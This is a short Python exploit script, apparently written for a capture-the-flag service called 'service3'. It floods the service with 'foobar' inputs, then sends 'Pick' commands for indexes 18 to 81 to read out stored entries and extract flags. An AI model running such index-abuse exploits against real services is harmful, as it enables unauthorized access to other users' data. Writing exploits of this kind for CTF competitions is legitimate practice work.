#!/usr/bin/env python3

from service3_common import connect, extract_flags


def exploit():
    io = connect()
    for _ in range(100):
        io.sendline(b"foobar")
        io.recvuntil(b"Ready")
    s = b""
    for i in range(18, 18+64):
        io.sendline(f"Pick {i}".encode())
        s += io.recvuntil(b"Ready")
        # io.sendline(b'Clear')
        # io.recvuntil(b'Ready')
    extract_flags(s, True)


if __name__ == "__main__":
    exploit()
